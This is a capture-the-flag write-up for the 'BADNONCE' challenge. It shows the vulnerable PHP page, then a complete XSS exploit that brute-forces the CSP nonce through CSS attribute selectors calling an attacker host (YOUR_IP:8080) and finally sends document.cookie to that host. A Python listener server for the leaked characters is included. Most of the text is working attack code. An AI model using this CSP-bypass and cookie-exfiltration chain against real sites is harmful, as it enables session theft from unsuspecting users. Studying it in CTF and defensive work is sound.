# BADNONCE PART 1
The goal was clear - steal the flag from admin's (crawler's) cookies via XSS. There was just one little problem - CSP (Content Security Policy) protection. Basically you have to add nonce attribute with specific value to every script tag in the page to run. Luckily the nonce was based on php sessid so it wasn't changing with every request. We can bruteforce the nonce with css selectors (http://sirdarckcat.blogspot.com/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html) and that's it.

### SRC of the page
```html
<?php
session_start();
$nonce = md5(session_id());
$_SESSION['count'] = isset($_SESSION['count']) ? $_SESSION['count'] + 1 : 0;
if ($_SESSION['count'] > 3){
    setcookie('flag2', null, -1, '/');
}
if (!isset($_GET['q'])){
    header('Location: /?q=[XSS]');
}
?>
<html>
    <head>
        <meta http-equiv="Content-Security-Policy" content="script-src 'nonce-<?= $nonce ?>';">
        <title>BADNONCE</title>
        <style>.container{width: 80%;font-size: 17px;} .bold{font-weight: bold;} .note{font-size: 10px;}</style>
    </head>
    <body>
        <h1>BADNONCE</h1>
        <div id="container" class="container">
            <div id="crawler">
                <p>You can send me an URL from <a href="/submit/">here</a>.</p>
                <p>Administrators will check your link. <a href="/part_of_crawler.js">Here is the part of the crawler administrators use.</a></p>
                <p>This session id was used <?= $_SESSION['count'] ?> times :-)</p>
            </div>
            <div id="q" class="note">
                <p class="bold">This page uses Content-Security-Policy (CSP). Therefore it's safe from XSS! :-)</p>
                <script nonce=<?= $nonce ?>>
                               console.log('Welcome to the dungeon :-)');
                </script>
            </div>
        </div>
        <!-- Here is an injection point :-) -->
        <?= $_GET['q'] ?>
        <hr>
        <div>
            <h2>src of this page</h2>
            <?php highlight_file(__FILE__); ?>
        </div>
    </body>
</html>
```

### Payload that was passed to the crawler
``` html
<iframe id="iframe" src="http://35.187.214.138:10023"></iframe>
<script>
    var iframe = document.getElementById("iframe");

    // Current state of nonce
    var nonce = "";

    // Final payload
    function final() {
            // Set stolen nonce to script tag and stole cookies via HTTP request to our server
            iframe.src = "http://35.187.214.138:10023/?q=<script nonce=" + nonce + "%3Edocument.location.href%20%3D%20%27http%3A%2F%2FYOUR_IP%3A8080%2F%27%20%2B%20document.cookie%3C%2Fscript%3E";
    }

    // AJAX response handler
    var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function () {
            if (this.readyState == 4 && this.status == 200) {
                // Check if nonce is done
                if (this.responseText != "") {
                    nonce = this.responseText
                    if (nonce.length == 32) {
                        final()
                        return;
                    }
                }

                // Generate payload for stealing next character by CSS selector CSP bypass
                // http://sirdarckcat.blogspot.com/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html
                var src = "http://35.187.214.138:10023/?q="
                var chars = "0123456789abcdefghiklmnopqrstuvwxyz";
                for (var i = 0; i < 35; i++) {
                    src += "<style>*[nonce^='" + nonce + chars.charAt(i) + "']{background:url('http://YOUR_IP:8080/" + nonce + chars.charAt(i) + "')}</style>"
                }
                iframe.src = src
            }
        };

    iframe.addEventListener("load", function () {
        xhttp.open("GET", "http://YOUR_IP:8080/R", true);
        xhttp.send();
    });
</script>
```

### Server side code for listening nonce
``` python
from http.server import BaseHTTPRequestHandler, HTTPServer
import logging

class S(BaseHTTPRequestHandler):
    def do_GET(self):
        # Root
        if (self.path == "/"):
            f = open("index.html", "rb")
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(f.read())
            f.close()
        # Used for update checking
        elif self.path == "/R":
            f = open("state.txt", "rb")
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(f.read())
            f.close()
        # Ignore favicon.ico request
        elif self.path == "/favicon.ico":
            pass
        # Steal character of nonce
        else:
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write("a".encode('utf-8'))
            last_char = self.path.replace("/", "")
            f = open("state.txt", "w")
            f.write(last_char)
            f.close()

    def do_POST(self):
        pass

# INIT
def run(server_class=HTTPServer, handler_class=S, port=8080):
    logging.basicConfig(level=logging.INFO)
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    logging.info('Starting httpd...\n')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('Stopping httpd...\n')


if __name__ == '__main__':
    from sys import argv

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()
```
